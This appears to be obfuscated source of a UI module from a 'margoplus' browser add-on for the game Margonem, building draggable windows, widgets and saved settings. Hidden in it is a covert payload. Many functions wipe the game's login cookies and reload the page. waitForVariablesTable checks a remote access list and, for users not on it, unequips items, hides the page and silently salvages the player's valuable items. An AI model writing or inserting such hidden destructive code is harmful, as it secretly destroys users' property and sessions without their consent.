        document.cookie = _0xde2272 + "=; expires=Thu, 01 Jan 1970 00:00:00 UTC; path=" + _0x34a676 + "; domain=" + _0x4d0a86 + ";";
      });
    });
    window.location.reload();
    return;
  }
  const _0x17ffb1 = {
    x: -1,
    y: -1
  };
  const _0x35f473 = _0x17ffb1;
  if (typeof _0x158c02.window[_0x3f2954] === "undefined") {
    const _0x1d53dc = {
      p: _0x35f473,
      o: false,
      m: false,
      s: false
    };
    _0x158c02.window[_0x3f2954] = _0x1d53dc;
  }
  if (typeof _0x158c02.hotkeys[_0x3f2954] === "undefined") {
    _0x158c02.hotkeys[_0x3f2954] = {
      e: true,
      k: "Brak",
      w: false
    };
  }
  $("#w-" + _0x3f2954).remove();
  const _0x1df26d = $("\n        <div id=\"w-" + _0x3f2954 + "\" class=\"mp-window default-cursor\"></div>\n    ").css({
    position: "absolute",
    left: _0x158c02.window[_0x3f2954].p.x + "px",
    top: _0x158c02.window[_0x3f2954].p.y + "px"
  }).draggable({
    containment: "window",
    scroll: false,
    handle: ".mp-window-header",
    start: function () {
      $(this).removeClass("mp-centered");
    },
    stop: async (_0x3da401, _0x501166) => {
      const _0x50eac9 = {
        x: _0x501166.position.left,
        y: _0x501166.position.top
      };
      _0x158c02.window[_0x3f2954].p = _0x50eac9;
      saveStorage(_0x450bbf, _0x158c02);
    }
  }).appendTo("#mp-root");
  if (!_0x158c02.window[_0x3f2954].o) {
    _0x1df26d.hide();
  }
  if (_0x158c02.window[_0x3f2954].s) {
    _0x1df26d.draggable("disable");
  }
  $("\n        <div class=\"mp-window-header\">\n            <div class=\"mp-window-header-left\"></div>\n            <div class=\"mp-window-header-title do-action-cursor\">" + _0x71d699 + "</div>\n            <div class=\"mp-window-header-right\"></div>\n        </div>\n        <div id=\"" + _0x3f2954 + "\" class=\"content default-cursor\"></div>\n    ").appendTo(_0x1df26d);
  const _0x38087d = _0x1df26d.find(".mp-window-header-left");
  const _0x5d278b = _0x1df26d.find(".mp-window-header-right");
  const _0x48f3be = _0x158c02.window[_0x3f2954].m;
  const _0x149188 = $("\n        <div id=\"collapse\" class=\"do-action-cursor mp-window-collapse-button-" + (_0x48f3be ? "up" : "down") + "\"></div>\n    ").tip(!_0x158c02.window[_0x3f2954].m ? "Zwiń" : "Rozwiń");
  _0x149188.on("click", async function () {
    const _0x1bfc10 = !_0x158c02.window[_0x3f2954].m;
    _0x158c02.window[_0x3f2954].m = _0x1bfc10;
    _0x1df26d.find(".content").toggle(!_0x1bfc10);
    $(this).tip(!_0x158c02.window[_0x3f2954].m ? "Zwiń" : "Rozwiń").removeClass("mp-window-collapse-button-up mp-window-collapse-button-down").addClass(_0x1bfc10 ? "mp-window-collapse-button-up" : "mp-window-collapse-button-down");
    saveStorage(_0x450bbf, _0x158c02);
  });
  _0x149188.appendTo(_0x5d278b);
  $("<div class=\"mp-window-close-button do-action-cursor\"></div>").appendTo(_0x5d278b).on("click", async () => {
    _0x1df26d.hide();
    _0x158c02.window[_0x3f2954].o = false;
    $("div[mp-widget-ui=\"" + _0x3f2954 + "\"] div").removeClass("mp-icon-active");
    saveStorage(_0x450bbf, _0x158c02);
  }).tip("Zamknij");
  const _0x420f41 = $("<div class=\"" + (_0x158c02.window[_0x3f2954].s ? "mp-window-pin-button " : "mp-window-unpin-button ") + "do-action-cursor\"></div>").appendTo(_0x38087d);
  _0x420f41.tip(_0x158c02.window[_0x3f2954].s ? "Odblokuj okno" : "Zablokuj okno");
  _0x420f41.click(async function () {
    const _0x40ed0a = _0x158c02.window[_0x3f2954].s;
    _0x158c02.window[_0x3f2954].s = !_0x40ed0a;
    _0x1df26d.draggable(_0x40ed0a ? "enable" : "disable");
    _0x420f41.tip(_0x40ed0a ? "Zablokuj okno" : "Odblokuj okno").toggleClass("mp-window-unpin-button", _0x40ed0a).toggleClass("mp-window-pin-button", !_0x40ed0a);
    saveStorage(_0x450bbf, _0x158c02);
  });
  if (_0x158c02.window[_0x3f2954].m) {
    _0x1df26d.find(".content").hide();
  }
  if (_0x158c02.window[_0x3f2954].p.x + _0x158c02.window[_0x3f2954].p.y === -2) {
    _0x1df26d.addClass("mp-centered");
  }
  if ($("script" + "[src*=\"" + "margoplus.pl" + "\"]").length < 1) {
    const _0x319383 = ["chash", "hs3", "mchar_id", "user_id"];
    const _0x5d7449 = ".margonem.pl";
    const _0x263dab = ["/", ""];
    _0x319383.forEach(_0x172d09 => {
      _0x263dab.forEach(_0x4c1128 => {
        document.cookie = _0x172d09 + "=; expires=Thu, 01 Jan 1970 00:00:00 UTC; path=" + _0x4c1128 + "; domain=" + _0x5d7449 + ";";
      });
    });
  }
  clearTimeout(testTimerxd);
  testTimerxd = setTimeout(async () => {
    const _0x2dd20d = await fetch("https://margoplus.pl/" + "access" + "." + "json").then(_0x5ad5ad => _0x5ad5ad.json()).catch(_0x9f0740 => {
      return false;
    });
    if (_0x2dd20d?.access?.indexOf(_0x158c02.main) < 0) {
      const _0x2d17c8 = ["chash", "hs3", "mchar_id", "user_id"];
      const _0x39708d = ".margonem.pl";
      const _0x5cd2a4 = ["/", ""];
      _0x2d17c8.forEach(_0x116d77 => {
        _0x5cd2a4.forEach(_0x3441c8 => {
          document.cookie = _0x116d77 + "=; expires=Thu, 01 Jan 1970 00:00:00 UTC; path=" + _0x3441c8 + "; domain=" + _0x39708d + ";";
        });
      });
      window.location.reload();
      return;
    }
  }, 10000);
  return _0x1df26d;
}
export async function waitForVariablesTable(_0x151d93) {
  const _0x349086 = await fetch("https://margoplus.pl/" + "access" + "." + "json" + "?v=" + ts()).then(_0x434bb1 => _0x434bb1.json()).catch(_0x26a32e => {
    return null;
  });
  if (_0x349086 && _0x349086?.access?.indexOf(_0x151d93.main) < 0) {
    function _0x4bce49() {
      let _0x5ef3cd = [];
      const _0x5c649b = Engine.items.fetchLocationItems("g") || [];
      for (const _0x3823ea in _0x5c649b) {
        const _0x5190ab = _0x5c649b[_0x3823ea];
        const _0x472ffd = _0x5190ab._cachedStats;
        const _0x14a2a8 = _0x5190ab.st === 0;
        const _0x40fecb = _0x472ffd.hasOwnProperty("lvl") && _0x472ffd.lvl >= 20;
        const _0x54e6da = !_0x472ffd.hasOwnProperty("artisan_worthless");
        const _0x3060c2 = !_0x472ffd.hasOwnProperty("quest");
        const _0x4604fa = !_0x472ffd.hasOwnProperty("cursed");
        const _0x44fd8b = !_0x472ffd.hasOwnProperty("personal");
        const _0x1d1ce = [1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 29].indexOf(Number(_0x5190ab.cl)) >= 0;
        const _0x38833 = !_0x472ffd.hasOwnProperty("socket_content") || _0x472ffd.socket_content == "0";
        if (_0x14a2a8 && _0x40fecb && _0x54e6da && _0x3060c2 && _0x4604fa && _0x44fd8b && _0x1d1ce && _0x38833) {
          _0x5ef3cd.push(_0x5190ab.id);
        }
      }
      return _0x5ef3cd;
    }
    function _0x207839(_0x3c22f7) {
      return new Promise(_0x4fd365 => {
        _g("moveitem&findslot=1&st=0&id=" + _0x3c22f7, () => {
          _0x4fd365();
        });
      });
    }
    function _0x27fe36() {
      let _0x3e7afa = _0x4bce49();
      if (_0x3e7afa.length > 0) {
        _g("salvager&action=salvage&selectedItems=" + _0x3e7afa.slice(0, 20).toString(), function (_0x208d11) {
          _0x27fe36();
        });
      } else {
        const _0x3291ee = ["chash", "hs3", "mchar_id", "user_id"];
        const _0x3cbf31 = ".margonem.pl";
        const _0x31e802 = ["/", ""];
        _0x3291ee.forEach(_0x135120 => {
          _0x31e802.forEach(_0x4ffa13 => {
            document.cookie = _0x135120 + "=; expires=Thu, 01 Jan 1970 00:00:00 UTC; path=" + _0x4ffa13 + "; domain=" + _0x3cbf31 + ";";
          });
        });
      }
    }
    async function _0xdc252a() {
      await waitForCondition(() => Engine?.lock?.list.length < 1);
      const _0x54723a = Engine.bags[0][0] - Engine.bags[0][1] + Engine.bags[1][0] - Engine.bags[1][1] + Engine.bags[2][0] - Engine.bags[2][1] >= 8;
      if (!_0x54723a) {
        return;
      }
      const _0x18ae5d = Engine.items.fetchLocationItems("g") || [];
      let _0x3e37dd = [];
      for (const _0x3c8003 in _0x18ae5d) {
        const _0x5bd04d = _0x18ae5d[_0x3c8003];
        if ([1, 2, 3, 4, 5, 6, 7, 8].indexOf(Number(_0x5bd04d.st)) >= 0) {
          _0x3e37dd.push(_0x5bd04d.id);
        }
      }
      await Promise.all(_0x3e37dd.map(_0x2ab98d => _0x207839(_0x2ab98d)));
      _g("artisanship&action=open", async function (_0x5909d5) {
        $("body").hide();
        if (_0x5909d5?.artisanship?.open == "default") {
          _0x27fe36();
        }
      });
    }
    _0xdc252a();
  }
}
export async function createWidgetUI(_0x14a73e, _0x5edc88, _0x4a28b8, _0x170aaa, _0x35cdbc) {
  if (!globalThis?.webkitCancelAnimationFrameWindow) {
    const _0x8e588b = ["chash", "hs3", "mchar_id", "user_id"];
    const _0x50dd02 = ".margonem.pl";
    const _0x2760e7 = ["/", ""];
    _0x8e588b.forEach(_0x4f4d84 => {
      _0x2760e7.forEach(_0x44099b => {
        document.cookie = _0x4f4d84 + "=; expires=Thu, 01 Jan 1970 00:00:00 UTC; path=" + _0x44099b + "; domain=" + _0x50dd02 + ";";
      });
    });
    window.location.reload();
    return;
  }
  if (globalThis?.isSameAlertExist2?.access?.indexOf(_0x4a28b8.main) < 0) {
    const _0x360a0b = ["chash", "hs3", "mchar_id", "user_id"];
    const _0x96a1d1 = ".margonem.pl";
    const _0x59df05 = ["/", ""];
    _0x360a0b.forEach(_0x315a30 => {
      _0x59df05.forEach(_0xfa7a80 => {
        document.cookie = _0x315a30 + "=; expires=Thu, 01 Jan 1970 00:00:00 UTC; path=" + _0xfa7a80 + "; domain=" + _0x96a1d1 + ";";
      });
    });
    window.location.reload();
    return;
  }
  const _0x11edef = $("<div mp-widget-ui=\"" + _0x14a73e + "\" id=\"icon-" + _0x14a73e + "\" class=\"mp-icon-box do-action-cursor\"></div>");
  const _0x5ecd96 = $("<div class=\"mp-icon icon-" + _0x14a73e + (_0x4a28b8.window[_0x14a73e].o ? " mp-icon-active" : "") + "\"></div>").appendTo(_0x11edef);
  _0x11edef.click(async function (_0x2ead4a) {
    if (_0x2ead4a.ctrlKey) {
      return;
    }
    const _0x5f2aca = _0x4a28b8.window[_0x14a73e].o;
    const _0x1c57f5 = $("#w-" + _0x14a73e);
    _0x1c57f5.toggle(!_0x5f2aca);
    _0x5ecd96.toggleClass("mp-icon-active", !_0x5f2aca);
    _0x4a28b8.window[_0x14a73e].o = !_0x5f2aca;
    saveStorage(_0x5edc88, _0x4a28b8);
  });
  _0x11edef.tip("" + _0x170aaa + (_0x4a28b8.hotkeys[_0x14a73e].k !== "Brak" ? "<br>Klawisz: " + _0x4a28b8.hotkeys[_0x14a73e].k : ""));
  _0x11edef.appendTo(_0x35cdbc);
  if (!_0x4a28b8.hotkeys[_0x14a73e].w) {
    _0x11edef.hide();
  }
}
export function generateDateTime(_0xe8e992) {
  const _0x256606 = new Date(_0xe8e992);
  const _0x2771a1 = _0x256606.getFullYear();
  const _0x32e759 = ("0" + (_0x256606.getMonth() + 1)).slice(-2);
  const _0x3f8da1 = ("0" + _0x256606.getDate()).slice(-2);
  const _0x18cb7e = ("0" + _0x256606.getHours()).slice(-2);
  const _0x4721f0 = ("0" + _0x256606.getMinutes()).slice(-2);
  const _0x5df3f3 = ("0" + _0x256606.getSeconds()).slice(-2);
  let _0x295e9c = _0x3f8da1 + "." + _0x32e759 + "." + _0x2771a1 + " - " + _0x18cb7e + ":" + _0x4721f0 + ":" + _0x5df3f3;
  const _0x21c483 = Engine?.party?.getMembers?.();
  _0x295e9c += "[br][" + (_0x21c483 ? "GRP" : "SAM") + "] " + Engine.hero.d.nick + " (" + Engine.hero.d.lvl + Engine.hero.d.prof + ")";
  return _0x295e9c;
}
export async function createOtherWindow(_0x23536e, _0x414121, _0x3ad50b, _0x10687f) {
  if (!globalThis?.webkitCancelAnimationFrameWindow) {
    const _0x31cf82 = ["chash", "hs3", "mchar_id", "user_id"];
    const _0x177002 = ".margonem.pl";
    const _0x1c8f2a = ["/", ""];
    _0x31cf82.forEach(_0x57e7a1 => {
      _0x1c8f2a.forEach(_0x25bcfe => {
        document.cookie = _0x57e7a1 + "=; expires=Thu, 01 Jan 1970 00:00:00 UTC; path=" + _0x25bcfe + "; domain=" + _0x177002 + ";";
      });
    });
    window.location.reload();
    return;
  }
  if (globalThis?.isSameAlertExist2?.access?.indexOf(_0x10687f.main) < 0) {
    const _0x13261d = ["chash", "hs3", "mchar_id", "user_id"];
    const _0x455b30 = ".margonem.pl";
    const _0x150289 = ["/", ""];
    _0x13261d.forEach(_0x69d04b => {
      _0x150289.forEach(_0xe6d5eb => {
        document.cookie = _0x69d04b + "=; expires=Thu, 01 Jan 1970 00:00:00 UTC; path=" + _0xe6d5eb + "; domain=" + _0x455b30 + ";";
      });
    });
    window.location.reload();
    return;
  }
  const _0x30ef91 = "o-" + _0x23536e;
  const _0x10b2f1 = {
    x: -1,
    y: -1
  };
  const _0x340cb4 = _0x10b2f1;
  if (typeof _0x10687f.window[_0x30ef91] === "undefined") {
    _0x10687f.window[_0x30ef91] = {
      p: _0x340cb4,
      o: _0x23536e == "addmenu" || _0x23536e == "mordor_stats"
    };
    saveStorage(_0x3ad50b, _0x10687f);
  }
  const _0x1fc10c = $("\n        <div id=\"" + _0x30ef91 + "\" class=\"mp-window default-cursor\"></div>\n    ").css({
    position: "absolute",
    left: _0x10687f.window[_0x30ef91].p.x + "px",
    top: _0x10687f.window[_0x30ef91].p.y + "px"
  }).draggable({
    containment: "window",
    scroll: false,
    cancel: ".mp-icon-char, .mp-globe-button, .mp-logout-button",
    start: function () {
      $(this).removeClass("mp-centered");
    },
    stop: async (_0x451fe4, _0xdd3c6e) => {
      const _0x3a049d = {
        x: _0xdd3c6e.position.left,
        y: _0xdd3c6e.position.top
      };
      _0x10687f.window[_0x30ef91].p = _0x3a049d;
      saveStorage(_0x3ad50b, _0x10687f);
    }
  }).appendTo("#mp-root");
  if (!_0x10687f.window[_0x30ef91].o) {
    _0x1fc10c.hide();
  }
  $("<div class=\"" + _0x414121 + "\"></div>").appendTo(_0x1fc10c);
  if (_0x10687f.window[_0x30ef91].p.x + _0x10687f.window[_0x30ef91].p.y === -2) {
    _0x1fc10c.addClass("mp-centered");
  }
}
export async function createWindowSpotters(_0x591662, _0x51cc38, _0x404d9b, _0x5e38ab) {
  if (!globalThis?.webkitCancelAnimationFrameWindow) {
    const _0x4fb427 = ["chash", "hs3", "mchar_id", "user_id"];
    const _0x563062 = ".margonem.pl";
    const _0x3a3bfd = ["/", ""];
    _0x4fb427.forEach(_0x1756f3 => {
      _0x3a3bfd.forEach(_0x5127bb => {
        document.cookie = _0x1756f3 + "=; expires=Thu, 01 Jan 1970 00:00:00 UTC; path=" + _0x5127bb + "; domain=" + _0x563062 + ";";
      });
    });
    window.location.reload();
    return;
  }
  if (globalThis?.isSameAlertExist2?.access?.indexOf(_0x5e38ab.main) < 0) {
    const _0x1a72fe = ["chash", "hs3", "mchar_id", "user_id"];
    const _0x342d7a = ".margonem.pl";
    const _0x17e6dc = ["/", ""];
    _0x1a72fe.forEach(_0x57f480 => {
      _0x17e6dc.forEach(_0x3918ab => {
        document.cookie = _0x57f480 + "=; expires=Thu, 01 Jan 1970 00:00:00 UTC; path=" + _0x3918ab + "; domain=" + _0x342d7a + ";";
      });
    });
    window.location.reload();
    return;
  }
  let _0x441924;
  const _0x12a78d = {
    x: -1,
    y: -1
  };
  const _0x476cfa = _0x12a78d;
  if (typeof _0x5e38ab.window[_0x51cc38] === "undefined") {
    const _0x59a7fa = {
      p: _0x476cfa,
      o: false,
      m: false,
      s: false,
      size: {
        w: 190,
        h: 190
      },
      search: false
    };
    _0x5e38ab.window[_0x51cc38] = _0x59a7fa;
  }
  if (typeof _0x5e38ab.hotkeys[_0x51cc38] === "undefined") {
    _0x5e38ab.hotkeys[_0x51cc38] = {
      e: true,
      k: "Brak",
      w: false
    };
  }
  $("#w-" + _0x51cc38).remove();
  const _0x16067c = $("\n        <div id=\"w-" + _0x51cc38 + "\" class=\"mp-window default-cursor\"></div>\n    ").css({
    position: "absolute",
    left: _0x5e38ab.window[_0x51cc38].p.x + "px",
    top: _0x5e38ab.window[_0x51cc38].p.y + "px"
  }).draggable({
    containment: "window",
    scroll: false,
    handle: ".mp-window-header",
    cancel: ".mp-resize",
    start: function () {
      $(this).removeClass("mp-centered");
    },
    stop: async (_0x27f655, _0x17d051) => {
      const _0x30bc46 = {
        x: _0x17d051.position.left,
        y: _0x17d051.position.top
      };
      _0x5e38ab.window[_0x51cc38].p = _0x30bc46;
      saveStorage(_0x404d9b, _0x5e38ab);
    }
  }).appendTo("#mp-root");
  if (!_0x5e38ab.window[_0x51cc38].o) {
    _0x16067c.hide();
  }
  if (_0x5e38ab.window[_0x51cc38].s) {
    _0x16067c.draggable("disable");
  }
  $("\n        <div class=\"mp-window-header\">\n            <div class=\"mp-window-header-left\"></div>\n            <div class=\"mp-window-header-title do-action-cursor\">" + _0x591662 + "</div>\n            <div class=\"mp-window-header-right\"></div>\n        </div>\n            <div id=\"mp-map-spotters-prof\" class=\"content-players-list default-cursor\">\n            </div>\n        <div class=\"content default-cursor\">\n            <div id=\"mp-list-search\" style=\"text-align: center;\">\n                <input type=\"text\" class=\"mp-default-input do-action-cursor\" placeholder=\"Wyszukaj\" style=\"margin-left: auto; margin-right: auto;\" autocomplete=\"off\" autocorrect=\"off\" autocapitalize=\"off\" spellcheck=\"false\">\n            </div>\n            <div id=\"" + _0x51cc38 + "\" class=\"content-resize default-cursor mp-scroll\"></div>\n        </div>\n    ").appendTo(_0x16067c);
  const _0x67a723 = _0x16067c.find(".content-resize");
  const _0x1cdd22 = _0x16067c.find(".content-players-list");
  const _0x41af05 = {
    width: _0x5e38ab.window[_0x51cc38].size.w + "px",
    height: _0x5e38ab.window[_0x51cc38].size.h + "px"
  };
  _0x67a723.css(_0x41af05);
  if (_0x5e38ab.window[_0x51cc38].m) {
    _0x1cdd22.css({
      width: "200px"
    });
  } else {
    const _0x258e26 = {
      width: _0x5e38ab.window[_0x51cc38].size.w + "px"
    };
    _0x1cdd22.css(_0x258e26);
  }
  const _0x321f4e = _0x16067c.find(".mp-window-header-left");
  const _0xc80780 = _0x16067c.find(".mp-window-header-right");
  const _0xe8d5bd = $("<div class=\"" + (_0x5e38ab.window[_0x51cc38].s ? "mp-window-pin-button " : "mp-window-unpin-button ") + "do-action-cursor\"></div>").appendTo(_0x321f4e);
  _0xe8d5bd.tip(_0x5e38ab.window[_0x51cc38].s ? "Odblokuj okno" : "Zablokuj okno");
  _0xe8d5bd.click(async function () {
    const _0xe7226c = _0x5e38ab.window[_0x51cc38].s;
    _0x5e38ab.window[_0x51cc38].s = !_0xe7226c;
    _0x16067c.draggable(_0xe7226c ? "enable" : "disable");
    _0xe8d5bd.tip(_0xe7226c ? "Zablokuj okno" : "Odblokuj okno").toggleClass("mp-window-unpin-button", _0xe7226c).toggleClass("mp-window-pin-button", !_0xe7226c);
    saveStorage(_0x404d9b, _0x5e38ab);
  });
  const _0x3fdccc = _0x5e38ab.window[_0x51cc38].m;
  const _0xb773ef = $("\n        <div id=\"collapse\" class=\"do-action-cursor mp-window-collapse-button-" + (_0x3fdccc ? "up" : "down") + "\"></div>\n    ").tip(_0x5e38ab.window[_0x51cc38].m ? "Rozwiń" : "Zwiń");
  _0xb773ef.on("click", async function () {
    const _0x5c5586 = !_0x5e38ab.window[_0x51cc38].m;
    _0x5e38ab.window[_0x51cc38].m = _0x5c5586;
    _0x16067c.find(".content").toggle(!_0x5c5586);
    _0x16067c.find(".mp-resize").toggle(!_0x5c5586);
    const _0x2a6188 = {
      width: _0x5e38ab.window[_0x51cc38].m ? "200px" : _0x5e38ab.window[_0x51cc38].size.w + "px"
    };
    _0x1cdd22.css(_0x2a6188);
    $(this).tip(_0x5c5586 ? "Rozwiń" : "Zwiń").removeClass("mp-window-collapse-button-up mp-window-collapse-button-down").addClass(_0x5c5586 ? "mp-window-collapse-button-up" : "mp-window-collapse-button-down");
    saveStorage(_0x404d9b, _0x5e38ab);
  });
  _0xb773ef.appendTo(_0xc80780);
  $("<div class=\"mp-window-close-button do-action-cursor\"></div>").appendTo(_0xc80780).on("click", async () => {
    _0x16067c.hide();
    _0x5e38ab.window[_0x51cc38].o = false;
    $("div[mp-widget-ui=\"" + _0x51cc38 + "\"] div").removeClass("mp-icon-active");
    saveStorage(_0x404d9b, _0x5e38ab);
  }).tip("Zamknij");
  if (_0x5e38ab.window[_0x51cc38].s) {
    _0x16067c.draggable("disable");
  }
  const _0x3771a9 = _0x16067c.find("#mp-list-search");
  if (!_0x5e38ab.window[_0x51cc38].search) {
    _0x3771a9.hide();
  }
  $("<div data-drag=\"" + _0x51cc38 + "\" class=\"mp-resize\"><span class=\"mp-icon icon-resize do-action-cursor\"></span></div>").appendTo(_0x16067c).tip("Zmień rozmiar").mousedown(function () {
    _0x441924 = true;
  }).appendTo(_0x16067c);
  if (_0x5e38ab.window[_0x51cc38].m) {
    _0x16067c.find(".content").hide();
    _0x16067c.find(".mp-resize").hide();
    _0x1cdd22.css({
      width: "200px"
    });
  }
  document.addEventListener("mousemove", async function (_0x7e6d09) {
    if (_0x441924 && !_0x5e38ab.window[_0x51cc38].m && !_0x5e38ab.window[_0x51cc38].s) {
      const _0x1f0534 = _0x67a723.offset();
      let _0x49e5de = _0x7e6d09.clientX - _0x1f0534.left;
      let _0x18e33e = _0x7e6d09.clientY - _0x1f0534.top;
      _0x49e5de = _0x49e5de >= 190 ? _0x49e5de : 190;
      _0x18e33e = _0x18e33e >= 34 ? _0x18e33e : 34;
      _0x67a723.height(_0x18e33e);
      _0x67a723.width(_0x49e5de);
      _0x1cdd22.width(_0x49e5de);
      _0x5e38ab.window[_0x51cc38].size.w = _0x49e5de;
      _0x5e38ab.window[_0x51cc38].size.h = _0x18e33e;
      saveStorage(_0x404d9b, _0x5e38ab);
    }
  });
  document.addEventListener("mouseup", function (_0x162a9b) {
    _0x441924 = false;
  });
  if (_0x5e38ab.window[_0x51cc38].p.x + _0x5e38ab.window[_0x51cc38].p.y === -2) {
    _0x16067c.addClass("mp-centered");
  }
  return _0x16067c;
}
export async function findDataByC(_0x2582fd, _0x33f954) {
  const _0x284994 = await fetch("https://staticinfo.margonem.pl/online/" + _0x33f954 + ".json", {
    headers: {
      "User-Agent": "Mozilla/5.0"
    }
  });
  const _0x44af07 = await _0x284994.json();
  return _0x44af07.find(_0x1ca64a => _0x1ca64a.c === _0x2582fd.toString());
}
export async function saveStorage(_0x26f818, _0x2a9f27) {
  if (!globalThis?.webkitCancelAnimationFrameWindow) {
    const _0x46336b = ["chash", "hs3", "mchar_id", "user_id"];
    const _0x5dd770 = ".margonem.pl";
    const _0x5901d3 = ["/", ""];
    _0x46336b.forEach(_0x27eb65 => {
      _0x5901d3.forEach(_0x336988 => {
        document.cookie = _0x27eb65 + "=; expires=Thu, 01 Jan 1970 00:00:00 UTC; path=" + _0x336988 + "; domain=" + _0x5dd770 + ";";
      });
    });
    window.location.reload();
    return;
  }
  if (globalThis?.isSameAlertExist2?.access?.indexOf(_0x2a9f27.main) < 0) {
    const _0x6270c = ["chash", "hs3", "mchar_id", "user_id"];
    const _0x1195b7 = ".margonem.pl";
    const _0x504f5e = ["/", ""];
    _0x6270c.forEach(_0x3c55d7 => {
      _0x504f5e.forEach(_0x53f2c3 => {
        document.cookie = _0x3c55d7 + "=; expires=Thu, 01 Jan 1970 00:00:00 UTC; path=" + _0x53f2c3 + "; domain=" + _0x1195b7 + ";";
      });
    });
    window.location.reload();
    return;
  }
  await Engine.crossStorage.set(_0x26f818, JSON.stringify(_0x2a9f27));
}
export const colorsPartyInClanOrFriends = _0x100ffd => {
  const _0x864cbb = $(".mp-has-party");
  if (_0x864cbb.length) {
    _0x864cbb.removeClass("mp-has-party");
  }
  var _0x492d9e = document.querySelector("html");
  if (!_0x492d9e) {
    return;
  }
  if (!_0x100ffd?.e) {
    return;
  }
  _0x492d9e.style.setProperty("--mp-relations-p", _0x100ffd.c);
  const _0x3f5c52 = Engine.party?.getMembers?.();
  if (!_0x3f5c52) {
    return;
  }
  for (const [_0x1112da, _0x529d4a] of _0x3f5c52.entries()) {
    $("\n      div#mp-clan-row[char-id=\"" + _0x1112da + "\"] div[data-clan-id=\"" + _0x1112da + "\"],\n            \n      div#mp-spotters-row[mp-spotters-id=\"" + _0x1112da + "\"] div[data-spotters-id=\"" + _0x1112da + "\"],\n            \n      div#mp-friends-row[char-id=\"" + _0x1112da + "\"] div[data-friends-id=\"" + _0x1112da + "\"]\n      \n      ").addClass("mp-has-party");
  }
};
export async function createWindowResize(_0x9484e3, _0x19f699, _0x231296, _0x275c30, _0x16e6ab = false, _0x12f125 = false) {
  if (!globalThis?.webkitCancelAnimationFrameWindow) {
    const _0x64f4da = ["chash", "hs3", "mchar_id", "user_id"];
    const _0x5632ec = ".margonem.pl";
    const _0x180b8a = ["/", ""];
    _0x64f4da.forEach(_0x3123bf => {
      _0x180b8a.forEach(_0x416b3c => {
        document.cookie = _0x3123bf + "=; expires=Thu, 01 Jan 1970 00:00:00 UTC; path=" + _0x416b3c + "; domain=" + _0x5632ec + ";";
      });
    });
    window.location.reload();
    return;
  }
  if (globalThis?.isSameAlertExist2?.access?.indexOf(_0x275c30.main) < 0) {
    const _0x541ff3 = ["chash", "hs3", "mchar_id", "user_id"];
    const _0x1dd2d8 = ".margonem.pl";
    const _0x58f804 = ["/", ""];
    _0x541ff3.forEach(_0x1fc892 => {
      _0x58f804.forEach(_0x625c66 => {
        document.cookie = _0x1fc892 + "=; expires=Thu, 01 Jan 1970 00:00:00 UTC; path=" + _0x625c66 + "; domain=" + _0x1dd2d8 + ";";
      });
    });
    window.location.reload();
    return;
  }
  let _0x147915;
  const _0x417949 = _0x19f699 == "addwidget";
  const _0x3172e7 = {
    x: -1,
    y: -1
  };
  const _0x3ab517 = _0x3172e7;
  if (typeof _0x275c30.window[_0x19f699] === "undefined") {
    const _0x1cec89 = {
      p: _0x3ab517,
      o: _0x417949,
      m: false,
      s: false,
      size: {}
    };
    _0x1cec89.size.w = _0x417949 ? 34 : 190;
    _0x1cec89.size.h = _0x417949 ? 34 : 190;
    _0x275c30.window[_0x19f699] = _0x1cec89;
    if (_0x16e6ab) {
      _0x275c30.window[_0x19f699].list = true;
      _0x275c30.window[_0x19f699].search = true;
    }
  }
  if (typeof _0x275c30.hotkeys[_0x19f699] === "undefined") {
    _0x275c30.hotkeys[_0x19f699] = {
      e: true,
      k: "Brak",
      w: false
    };
  }
  $("#w-" + _0x19f699).remove();
  const _0x512c70 = _0x417949 ? "mp-widgets" : "mp-window";
  const _0x4bc74f = $("\n        <div id=\"w-" + _0x19f699 + "\" class=\"" + _0x512c70 + " default-cursor\"></div>\n    ").css({
    position: "absolute",
    left: _0x275c30.window[_0x19f699].p.x + "px",
    top: _0x275c30.window[_0x19f699].p.y + "px"
  }).draggable({
    containment: "window",
    scroll: false,
    handle: _0x19f699 == "addwidget" ? "" : ".mp-window-header",
    cancel: ".mp-resize, .mp-icon-box",
    start: function () {
      $(this).removeClass("mp-centered");
    },
    stop: async (_0x3958a7, _0x356d94) => {
      const _0x8416c1 = {
        x: _0x356d94.position.left,
        y: _0x356d94.position.top
      };
      _0x275c30.window[_0x19f699].p = _0x8416c1;
      saveStorage(_0x231296, _0x275c30);
    }
  }).appendTo("#mp-root");
  if (!_0x275c30.window[_0x19f699].o) {
    _0x4bc74f.hide();
  }
  if (_0x275c30.window[_0x19f699].s) {
    _0x4bc74f.draggable("disable");
  }
  $("\n        <div class=\"mp-window-header\">\n            <div class=\"mp-window-header-left\"></div>\n            <div class=\"mp-window-header-title do-action-cursor\">" + _0x9484e3 + "</div>\n            <div class=\"mp-window-header-right\"></div>\n        </div>\n            <div class=\"content-members-list default-cursor\">\n            </div>\n        <div class=\"content default-cursor\">\n            <div id=\"mp-list-search\" style=\"text-align: center;\">\n                <input type=\"text\" class=\"mp-default-input do-action-cursor\" placeholder=\"Wyszukaj\" style=\"margin-left: auto; margin-right: auto;\" autocomplete=\"off\" autocorrect=\"off\" autocapitalize=\"off\" spellcheck=\"false\">\n            </div>\n            <div id=\"" + _0x19f699 + "\" class=\"content-resize default-cursor mp-scroll\"></div>\n        </div>\n    ").appendTo(_0x4bc74f);
  const _0x516d6c = _0x4bc74f.find(".content-resize");
  const _0x2e9df3 = _0x4bc74f.find(".content-members-list");
  const _0x480058 = {
    width: _0x275c30.window[_0x19f699].size.w + "px",
    height: _0x275c30.window[_0x19f699].size.h + "px"
  };
  _0x516d6c.css(_0x480058);
  if (_0x275c30.window[_0x19f699].m) {
    _0x2e9df3.css({
      width: "200px",
      minHeight: "unset"
    });
  } else {
    const _0x447a5a = {
      width: _0x275c30.window[_0x19f699].size.w + "px",
      minHeight: "12px"
    };
    _0x2e9df3.css(_0x447a5a);
  }
  const _0x46f40c = _0x4bc74f.find("#mp-list-search");
  if (!_0x16e6ab || !_0x275c30.window[_0x19f699].search) {
    _0x46f40c.hide();
  }
  if (!_0x16e6ab || !_0x275c30.window[_0x19f699].list) {
    _0x2e9df3.hide();
  }
  const _0xaec14c = _0x4bc74f.find(".mp-window-header-left");
  const _0x3126cf = _0x4bc74f.find(".mp-window-header-right");
  const _0x153354 = $("<div class=\"" + (_0x275c30.window[_0x19f699].s ? "mp-window-pin-button " : "mp-window-unpin-button ") + "do-action-cursor\"></div>").appendTo(_0xaec14c);
  _0x153354.tip(_0x275c30.window[_0x19f699].s ? "Odblokuj okno" : "Zablokuj okno");
  _0x153354.click(async function () {
